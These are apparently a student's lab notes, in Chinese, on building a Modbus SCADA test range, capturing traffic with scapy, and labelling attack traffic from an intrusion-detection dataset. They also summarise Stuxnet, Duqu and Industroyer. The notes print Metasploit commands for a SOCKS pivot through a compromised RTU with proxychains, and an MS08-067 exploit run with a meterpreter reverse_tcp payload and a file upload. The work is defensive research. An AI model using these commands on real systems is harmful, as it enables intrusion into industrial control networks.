#### 5/7

##### 目标： 构建“靶场”，采集正常的modbus交互数据，并生成pcap包用以保存
##### 设定目标运行环境：
宿主机： Windows 
虚拟软件： VMware 
虚拟机1: Ubuntu20.04   1 个 RTU
虚拟机2: Ubuntu20.04   1个 MTU
采集工具： scapy

##### 采集背景
每两秒轮询，采集4分钟数据，TCP采用短连接(每进行一次modbus数据交换进行一次新的tcp连接）
RTU的逻辑： 接收命令返回当前的电压值，电压离散数值0或者220仿真返回即可
MTU的逻辑： 发送命令请求当前的电压值
Manual Operation ： 自定义该行为

##### 三种数据采集方案：
1） 在MTU主机采集
2） 在RTU主机采集
3） 在Windows侧采集

##### 参考文献&需要实现的数据集场景：

- 《Providing SCADA network data sets for intrusion detection research 》Table 1 前6条
- 变量：MTU RTU 轮询间隔

------

##### 实验

环境：scapy无法抓同一IP上的包，所以需要VMWare设置桥接模式

在虚拟机上安装两个包

```sh
pip3 install modbus_tk
pip3 install scapy
```

RTU(slave)：`192.168.0.111`，开启502端口

```sh
sudo python3 tcpslave_example.py
```



MTU(master)：`192.168.0.109`

注意host设为RTU的IP

```python
# Connect to the slave
n=120
for i in range(n):
    if i%10==0:
        print(i)
    master = modbus_tcp.TcpMaster(host="192.168.0.111", port=502,timeout_in_sec=2.0)
    logger.info("connected")

    res = master.execute(slave=1,
                         function_code=cst.READ_HOLDING_REGISTERS,
                         starting_address=0,
                         quantity_of_x=10)
    time.sleep(2)
```

```sh
python3 tcpmaster_example.py
```



##### scapy抓包

```python
from scapy.all import *
cnt=0
def monitor(packet):
    global cnt
    cnt+=1
    print(cnt)
packet = sniff(prn=monitor,filter="tcp",store=1,timeout=240)
wrpcap(r'C:\Users\Mika\Desktop\组会\202205\output.pcap', packet)
```

- sniff：抓包后执行的函数
- filter：抓取的协议，包括ether, fddi, tr, wlan, ip, ip6, arp, rarp, decnet, tcp, udp, icmp
- store：是否保存
- timeout：嗅探时间

wrpcap将包保存为pcap文件。wireshark打开output.pcap，过滤栏填入modbus即可

Ubuntu使用scapy需要root

##### 抓包结果

MTU端、RTU端

![](202205/pic/scapy抓包.png)

Windows端：

- 路由器端口镜像：路由器上将经过指定端口（源端口）的数据报文复制一份到另一个指定端口（目标端口）上。需要交换机或者路由器支持端口镜像功能

<img src="202205/pic/端口镜像.jpg" style="zoom:67%;" />

#### 5/13

尝试分析一组网络攻击流量并总结出作者在实现并采集该流量的过程中所基于的攻击实现方式与攻击判定规则
对象：论文table 1中的Send_a_fake_command_Modbus 行
参考思路：

1. 请大家精读论文，从论文描述中尝试挖掘有效攻击信息
2. 对照该该行的实际数据集从中提取出正常流量、异常流量，对他们进行比较分析，包括但不限于人工眼学、数据挖掘、网上的经验知识(网上相关攻击的描述)。
期望产出结果： 根据这些不同来总结作者对攻击判定的规则(例如：以什么样的标准来判断是不是一个fake command)
备注： 希望大家尽量独立完成此次实验



##### 攻击判定规则

`Send_a_fake_command_Modbus`: Also includes sending a Modbus write operation from a compromised RTU using Metasploit proxy func-tionality and the proxychains tool

在该数据集中，192.168.1.100是MTU，101~106是六个RTU

下图4782-4791的异常流量是通过被攻击的RTU101来向RTU102发送写线圈请求。首先，101没有102的mac地址，所以广播ARP请求报文，102回复后，101发送写线圈请求

![](202205/pic/非法写线圈.png)

通过被攻击的RTU向其他RTU发送请求的恶意行为特征：

- 只要报文的源IP和目的IP都不是MTU，就是异常流量。因为只有MTU才能发送请求
- 前面伴随着ARP请求和回应报文
- 异常报文的Trans字段=1，但也可能是人工操作。（事务处理字段表示MTU第几次请求该RTU）
- 轮询间隔为10s，每次轮询请求和响应的时间都是10s的整数倍，不是整数倍的可能是异常流量，但不一定，也有人工操作



##### 攻击实现：ProxyChains代理链

（1）先用Metasploit攻下一个RTU1，然后ifconfig可以得知RTU1所属的网段，addroute添加至路由表

（2）然后，利用Metasploit pivot在RTU1上建立代理服务器，IP为SRVHOST（RTU1的内网IP），端口为1080，开启代理服务器

```sh
use auxiliary/server/socks_proxy
show options
set SRVHOST 0.0.0.0
exploit
# 看到[*] Starting the SOCKS proxy server即成功开启了代理，端口为1080
```

（3）然后配置`/etc/proxychains4.conf`，在最后填写代理服务器的socket，这样使用proxychains运行程序时就会通过代理服务器了。ProxyChains是Linux和其他Unix下的代理工具，它可以使任何程序通过代理上网

```sh
sudo nano /etc/proxychains4.conf
socks5 127.0.0.1 1080 
```

（4）在Linux命令前面加上proxychains，即可以通过代理服务器RTU1执行modbus-tk程序。

注意：修改目标IP为RTU2

```sh
proxychains python3 tcpmaster_example.py
```



#### 5/20

1.对于恶意软件
1）请对该恶意软件能实现的功能（何种攻击）进行概括
2）请查询是否有资料可以支持搭建该恶意软件环境
3）有余力可以尝试运行并截图
2.对于攻击事件
1）描述该攻击在当时造成的影响；
2）攻击的实施路径（即：攻击者从哪个环节开始，利用什么漏洞，一步一步如何渗透系统，最终控制系统做了什么事情）；
3）以现有知识来解释该路径是否可以实现（可以结合学习的软件来介绍）

##### 五、震网病毒（Stuxnet）2010

影响：在2009年11月至2010年1月下旬的某个时候摧毁了多达1000台铀离心机，美国和以色列政府打算将Stuxnet作为破坏或至少推迟伊朗发展核武器计划的工具。最终导致共十万台主机感染

目标：西门子公司控制系统的SCADA。环境：win2000/xp/vista/7/serve

PLC：可编程逻辑控制器，用于本地控制，而RTU远程控制

路径：

- 通过USB在伊朗核设施内进行传播。使用RPC（远程过程调用）来感染网段内其他主机
- 感染后，病毒利用windows漏洞执行操作。
- 检查计算机的注册表，是否连接西门子特定PLC（寻找八到十个阵列，每个阵列有168个变频器）
- 感染属于西门子WinCC（一个32位技术的过程监视系统）/PCS 7 SCADA控制软件的项目文件，将共享库函数文件s70tbxdx.dll重命名为s70tbxsx.dll，恶意软件伪装成合法的s70tbxdx.dll文件，能够拦截对原始库函数s70tbxdx.dll的调用
- 系统遭受攻击后，Step7软件调用被替代的s70tbxdx.dll和PLC通信，于是震网病毒可以拦截任何来自其他软件访问PLC的命令，从而实施侦察攻击（潜伏14天，记录正常通信数据）

利用的漏洞：

- （1）MS10-046（0day）（Windows INK快捷方式解析系统漏洞，Windows在显示快捷方式文件时，会根据文件中的信息寻找它所需的图标资源，并将其作为文件的图标展现给用户。如果图标资源在一个DLL文件中，系统就会加载这个DLL文件。攻击者可以构造这样一个快捷方式文件，使系统加载指定的DLL文件，从而执行其中的恶意代码）；
- （2）MS08-067（RPC远程执行和权限提升漏洞，攻击者可以通过恶意构造的网络包直接发起攻击，无需通过认证地运行任意代码，并且获取完整的权限，该漏洞常被蠕虫用于大规模的传播和攻击），当且仅当当前时间早于2030年1月1日，并且特定防病毒软件的病毒代码早于2009年1月，Kernel32.dll和Netapi32.dlI文件的时间戳早于2008年10月12日;
- （3）MS10-061（0day）（打印机后台程序服务漏洞，Windows打印后台程序没有合理地设置用户权限。攻击者可以通过提交精心构造的打印请求，将文件发送到暴露了打印后台程序接口的主机的%System32%目录中。成功利用这个漏洞可以以系统权限执行任意代码，从而实现传播和攻击；“震网病毒”向目标主机发送两个文件：winsta.exe、，在特定事件下,sysnullevnt.mof将驱使winsta.exe被执行）；
- （4）MS10-073（Oday）（Windows内核模式驱动程序中的漏洞可能允许特权提升），攻击对象包括SIMATIC WINCC7.0和SIMATIC WINCC6.3。

攻击结果：震网病毒攻击载荷运行时，会把变频频率提升到1410HZ，持续15分钟，然后再回到正常的1064HZ，持续26天，然后再2HZ的频率上持续50分钟，然后再恢复到正常的1064HZ，持续26天。通过改变离心机频率的方式对离心机构成破坏，并且活动难以预测

远程控制：互联网侧，震网病毒通过HTTP协议链接到C&C（命令和控制）服务器，更新自身版本，使用加密技术保护通信数据；内网侧，通过在感染主机上创建RPC服务的方式，完成局域网内病毒之间通信，实现感染主机之间的版本更新。

震网病毒的缺陷：传播到不兼容的低版本win系统，如95/98，导致蓝屏，被伊朗发现

##### 六、Duqu病毒（Stuxnet变种）2011

影响：在 2010 年导致伊朗核涡轮机发生故障，有证据证明Stuxnet和Duqu源自同一平台

Duqu寻找可能有用的信息来攻击工业控制系统。它的目的不是破坏性的，已知的组件试图收集信息。[14]然而，基于Duqu的模块化结构，特殊的有效载荷可以用来以任何方式攻击任何类型的计算机系统，因此基于Duqu的网络物理攻击可能是可能的。

路径：

- 通过钓鱼邮件发送包含恶意代码的word
- 利用漏洞：windows xp/2003/2008/7内核word文件处理远程代码执行漏洞
- 用户打开时自动执行恶意代码，下载并安装允许其情报收集和通信功能的其他Duqu模块，并使用被盗的数字密钥对其组件进行签名
- 功能：窃取某些特定格式文件，记录击键，将窃取的信息加密伪装成54x54像素的jpeg图片文件发送给攻击者。作为未来震网病毒攻击的基础

##### 十、Industroyer恶意软件(Crash override) 2015

影响：2015年12月23日，乌克兰至少有三个区域的电力系统被具有高度破坏性的恶意软件攻击，导致大规模停电，伊万诺-弗兰科夫斯克地区超过一半的家庭（约140万人）遭遇停电困扰；整个停电事件持续数小时之久。在发电站遭受攻击的同一时间，乌克兰境内的其他多家能源企业如煤炭、石油公司也遭到了针对性的网络攻击。

具体方法：

- 先通过电子邮件、办公网系统、外来运维终端、U盘等途径入侵一台主机
- 在该主机联网时下载代理服务模块作为后续攻击的回连跳板，并配置为Industroyer的主后门模块Main Backdoor的代理IP
- 对局域网扫描，发现目标RTU
- 使用HTTPS连接到其远程C&C服务器，并接收来自攻击者的控制命令
- 攻击：可以直接控制断路器，可导致变电站断电

Launcher模块分析：该模块为Main Backdoor下载的众多模块之一，其实际上为黑客的进一步攻击提供一个统一的攻击接口，可以说是专门为运行payload模块而设计的。该模块在系统中以服务程序运行，运行时会创建一个定时器。定时器触发时该模块会创建新线程加载hasio.dat模块并调用hasio.dat模块的Crash函数（关于hasio.），并且执行payload模块的Crash函数。通过启动器模块，恶意代码可以在指定的时间根据命令行运行任意的payload。

------

#### 5/27

1.针对SCADA论文中5个恶意攻击的模式来模拟攻击，并抓取流量。

2.如何在实验平台上抓取的流量进行标注，即：白流量是哪些、恶意流量是哪些；

##### 数据集5

数据集`exploit_ms08_netapi_modbus_6RTU_with_operate.pcap`：1MTU，6RTU，10s轮询间隔，5min。包含 1856 个数据包，其中有 1199 个恶意数据包，恶意流量通过一个被攻破的 RTU 使用 Metasploit ms08_netapi 攻击其他 RTU 生成。（均为IT侧恶意流量）

该数据集中，异常流量的ip源/目的地址全部为101和105，协议不包括modbus，包括【SMB、DCE/RPC、SRVSVC、SPOOLSS】、【TCP、SSLv3】。首先是攻击机通过101跨网段获取了105的权限，然后尝试在101和105之间发送TCP/SSL报文传文件。

##### SMB协议

SMB协议（Server Message Block）：在网络上的端点之间提供对文件、打印机和串行端口的共享访问；客户-服务器模式；基于TCP；位于会话层、表示层

- 客户端发送Negotiate Protocol请求，列出所有SMB协议版本，服务端响应；
- 客户端发送session setup认证请求，服务端响应；
- 完成认证后，客户端发送Tree connect请求，列出想访问的网络资源名称，服务端响应接收连接到该资源
- 连接到相应资源后，客户端
  - 通过read/write读写文件
  - 通过NT create打开文件夹
  - logoff注销会话

##### DCE/RPC 分布式RPC

RPC：远程过程调用，一台机器上的服务调用另一台机器上的服务

DCE/RPC：分布式RPC（Distributed Computing Environment / Remote Procedure Calls）

##### MS08-067 模拟攻击

MS08-067漏洞是通过 MSRPC（对 DCE/RPC 在 Windows 系统下的重新改进和实现） over SMB 通道调用 Server 服务程序中的 NetPathCanonicalize 函数时触发的，而 NetPathCanonicalize 函数在远程访问其他主机时，会调用 NetpwPathCanonicalize 函数，对远程访问的路径进行规范化，而在 NetpwPathCanonicalize 函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。

```sh
use exploit/windows/smb/ms08_067_netapi
set target 34
set payload windows/meterpreter/reverse_tcp
set RHOSTS 192.168.10.138
exploit

meterpreter > upload '/home/mika/Desktop/slav.py' 'C:\\Documents and Settings\\xuegod_root\\桌面'
```

下面是直接用Kali（131）攻击RTU（138），以及上传文件的抓包结果，在131上采集。

攻击机提权后，使得自己作为服务器，让138向131发送TCP请求，读取文件

![metasploit提权+上传文件](202205/metasploit提权+上传文件.png)

尚未实现：SSL在应用层对TCP加密

##### 黑白流量

| 数据集                                            | 含义                         | 黑流量                            |
| ------------------------------------------------- | ---------------------------- | --------------------------------- |
| moving_two_files_modbus_6RTU.pcap                 | 移动文件                     | 104->100之间SMB；RTU之间SSL/TCP   |
| send_a_fake_command_modbus_6RTU_with_operate.pcap | 通过RTU发送未授权写操作给RTU | RTU之间Modbus_TCP                 |
| characterization_modbus_6RTU_with_operate.pcap    | 101发送连续读命令给RTU       | RTU之间Modbus_TCP（数据集未标注） |
| CnC_uploading_exe_modbus_6RTU_with_operate.pcap   | 101发送exe给105              | 100->104之间SMB；RTU之间SSL/TCP   |
| exploit_ms08_netapi_modbus_6RTU_with_operate.pcap | 利用101对105攻击，并发送exe  | RTU之间SMB；RTU之间SSL/TCP        |

- SMB
- RTU之间非法指令
- Metasploit实施ms08攻击
- RTU之间传文件



![](202205/pic/pivoting.jpg)
